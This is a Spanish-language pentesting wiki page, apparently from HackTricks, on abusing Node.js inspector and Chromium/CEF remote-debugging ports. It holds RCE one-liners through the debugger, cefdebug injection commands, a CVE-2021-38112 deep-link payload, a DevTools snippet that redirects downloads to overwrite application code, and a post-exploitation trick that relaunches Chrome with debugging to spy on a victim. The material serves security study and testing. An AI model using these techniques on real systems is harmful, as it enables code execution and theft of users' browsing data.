# Abuso del depurador de Node/CEF

{{#include ../../banners/hacktricks-training.md}}

## Información Básica

[De la documentación](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Cuando se inicia con el interruptor `--inspect`, un proceso de Node.js escucha a un cliente de depuración. Por **defecto**, escuchará en el host y puerto **`127.0.0.1:9229`**. Cada proceso también se asigna un **UUID** **único**.

Los clientes del inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa se verá algo así como `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Dado que el **depurador tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso que pueda conectarse a este puerto puede ser capaz de ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).

Hay varias formas de iniciar un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando inicias un proceso inspeccionado, algo como esto aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) necesitan usar el parámetro: `--remote-debugging-port=9222` para abrir el **debugger** (las protecciones SSRF permanecen muy similares). Sin embargo, **en lugar de** otorgar una sesión de **debug** de **NodeJS**, se comunicarán con el navegador utilizando el [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), esta es una interfaz para controlar el navegador, pero no hay un RCE directo.

Cuando inicias un navegador en modo de depuración, aparecerá algo como esto:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets y política de mismo origen <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden hacer solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Una **conexión HTTP inicial** es necesaria para **obtener un id de sesión de depurador único**. La **política de mismo origen** **previene** que los sitios web puedan hacer **esta conexión HTTP**. Para mayor seguridad contra [**ataques de reencaminamiento DNS**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **encabezados 'Host'** para la conexión especifiquen ya sea una **dirección IP** o **`localhost`** o **`localhost6`** precisamente.

> [!NOTE]
> Estas **medidas de seguridad previenen la explotación del inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo cual podría hacerse explotando una vulnerabilidad SSRF).

### Iniciando el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener suficientes privilegios, por lo que esto podría otorgarte **acceso privilegiado a información dentro del proceso** pero no una escalada de privilegios directa.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Esto es útil en contenedores porque **cerrar el proceso y comenzar uno nuevo** con `--inspect` **no es una opción** porque el **contenedor** será **eliminado** junto con el proceso.

### Conectar al inspector/debugger

Para conectarse a un **navegador basado en Chromium**, se pueden acceder a las URLs `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configurar, se debe asegurar que el **host y puerto objetivo** estén correctamente listados. La imagen muestra un ejemplo de Ejecución Remota de Código (RCE):

![](<../../images/image (674).png>)

Usando la **línea de comandos** puedes conectarte a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** que se ejecutan localmente y **inyectar código** en ellos.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Tenga en cuenta que **los exploits de RCE de NodeJS no funcionarán** si está conectado a un navegador a través del [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debe consultar la API para encontrar cosas interesantes que hacer con ella).

## RCE en el Depurador/Inspector de NodeJS

> [!NOTE]
> Si llegó aquí buscando cómo obtener [**RCE de un XSS en Electron, consulte esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Algunas formas comunes de obtener **RCE** cuando puede **conectarse** a un **inspector** de Node son usar algo como (parece que esto **no funcionará en una conexión al protocolo de Chrome DevTools**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
En esta sección solo listaré cosas interesantes que he encontrado que la gente ha utilizado para explotar este protocolo.

### Inyección de Parámetros a través de Enlaces Profundos

En el [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security descubrió que una aplicación basada en CEF **registró un URI personalizado** en el sistema (workspaces://) que recibía el URI completo y luego **lanzaba la aplicación basada en CEF** con una configuración que se construía parcialmente a partir de ese URI.

Se descubrió que los parámetros del URI eran decodificados y utilizados para lanzar la aplicación básica de CEF, permitiendo a un usuario **inyectar** la bandera **`--gpu-launcher`** en la **línea de comandos** y ejecutar cosas arbitrarias.

Así que, una carga útil como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará un calc.exe.

### Sobrescribir Archivos

Cambia la carpeta donde **se van a guardar los archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** de la aplicación que se utiliza con frecuencia con tu **código malicioso**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE y exfiltración

Según esta publicación: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) es posible obtener RCE y exfiltrar páginas internas de theriver.

### Post-Explotación

En un entorno real y **después de comprometer** una PC de usuario que utiliza un navegador basado en Chrome/Chromium, podrías lanzar un proceso de Chrome con **la depuración activada y redirigir el puerto de depuración** para que puedas acceder a él. De esta manera, podrás **inspeccionar todo lo que la víctima hace con Chrome y robar información sensible**.

La forma sigilosa es **terminar todos los procesos de Chrome** y luego llamar a algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencias

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
